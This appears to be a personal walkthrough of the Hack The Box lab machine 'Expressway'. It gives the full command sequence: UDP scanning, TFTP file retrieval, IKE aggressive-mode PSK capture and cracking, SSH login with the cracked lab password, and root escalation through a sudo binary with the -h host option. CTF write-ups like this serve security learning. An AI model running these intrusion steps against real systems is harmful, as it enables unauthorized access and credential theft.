
 Given the an IP address for the machine `Expressway` on HTB I can start exploit it

- Let's start with a nmap scan to bust the open ports
```shell
nmap -A -T4 10.10.11.87
```
![[Pasted image 20250925140815.png]]
- The scan shows nothing interesting and nothing potentially vulnerable so maybe scanning for UDP ports instead of TCP ones can show something
```shell
nmap -sUV -v -T4 10.10.11.87
```
![[Pasted image 20250925153622.png]]
- The scan shows 2 UDP ports open:
	- port `69`: - It is assigned to `TFTP`, Trivial File Transfer Protocol, that lets you read and write files to or from a remote host
	- port `500`: - It serves as the default channel for `IKE`, Internet Key Exchange, negotiations

First, I decide to investigate the port `69`, in essence verifying `tftp`
- I found a very useful resource to help me with enumerating this port https://medium.com/@aashutos.katare/silent-servers-the-art-of-tftp-enumeration-265c3785a6b4

- First I use the `tftp-version.nse` script with nmap to check the server version
```shell
nmap -sU -p 69 --script=tftp-version.nse 10.10.11.87
```
![[Pasted image 20250925155052.png]]
- The scan does not give me anything useful

- Next I use the `tftp-enum` script with nmap to check for files present on the server
```shell
nmap -sU -p 69 --script=tftp-enum 10.10.11.87
```
![[Pasted image 20250925160318.png]]
- The script gives me a result, a file named `ciscortr.cfg` which is a Cisco default configuration file containing commands for all devices

Now I connect to the `tftp` server
```shell
tftp 10.10.11.87
```
- and I get the config file
```shell
tftp> get ciscortr.cfg
```

From the config file I found the next information that I thought would be useful
- `hostname expressway`
- `username ike password *****`
- `crypto isakmp client configuration group rtr-remote`
- `domain expressway.htb`

Having these information available I try to use `ike-scan` to check the connection to the host
```shell
ike-scan --id=ike@expressway.htb 10.10.11.87
```
- `--id=` - uses `ike@expressway.htb` as identification value (the user + domain)
![[Pasted image 20250925165932.png]]
- 2 things that I discover from the output are:
	1. I have to use the aggressive mode for my `--id` option to work
	2. It uses a `PSK` for Authentication so I have to get that `PSK`

Now let's use again `ike-scan` with the modification needed
```shell
ike-scan -A -Pike.psk --id=ike@expressway.htb 10.10.11.87
```
- `-A` turns on the Aggressive Mode
- `-P` + `ike.psk` will output the `PSK` in the `ike.psk` file
As a result I got the `ike.psk` file containing the `PSK` file
![[Pasted image 20250925170916.png]]
Having the hash, I need to crack and to help me with that I will use `psk-crack` + `rockyou.txt` wordlist to crack the hash
![[Pasted image 20250925171614.png]]
- I got a password, that being `freakingrockstarontheroad`

Now I have a set of credential:
- the user `ike`
- the password `freakingrockstarontheroad`
So now I have to try to connect with these credentials on `ssh`
```shell
ssh ike@10.10.11.87
Password: freakingrockstarontheroad
```
- I connected with success as the user `ike` and I also got the user flag from `user.txt`
![[Pasted image 20250925172545.png]]

## Root Flag

I start searching for potential targets
- First thing I noticed from the moment I logged in, is that the user is part of the group `proxy`
- So next check what files are owned by this group
```shell
find / -type f -group proxy 2>/dev/null
```
![[Pasted image 20250925205755.png]]
- The search gave me 5 files 
	- The first one is empty so is a dead end
	- The `.gz` archives gave me nothing again
	- The `cache.log.1` gave me nothing
- However, inside the `access.log.1` file I found a new domain `offramp.expressway.htb`
![[Pasted image 20250925210156.png]]
- Trying to do something with this domain, I found only dead ends

After some time I discovered something interesting:
- Using the command `env` to see the environmental variables, I discovered that the `PATH` variable has the `/usr/local/bin` directory in front of `/usr/bin` which is different form the basic configuration
![[Pasted image 20250925211141.png]]
- Now this got me thinking that there must be some binary in there that I can use
- Checking the directory I found the binary `sudo` which is a gold mine and points me that I must use `sudo` in some way 
![[Pasted image 20250925211422.png]]

- The `sudo` command has an option `-h host` that allows me to use the `sudo`command on a different host
- Also earlier I found the host `offramp.expressway.htb` so maybe I can pair these host with `sudo` and maybe I can execute commands as the root user

- So I try the following command to open a bash with higher privileges:
```shell
sudo -h offramp.exrpressway.htb bash
```
- And thanks God it worked and now I have access to the `root` user
- I confirm this with the `id` command and then I go in the `/root` directory to retrieve the flag
![[Pasted image 20250925212049.png]]
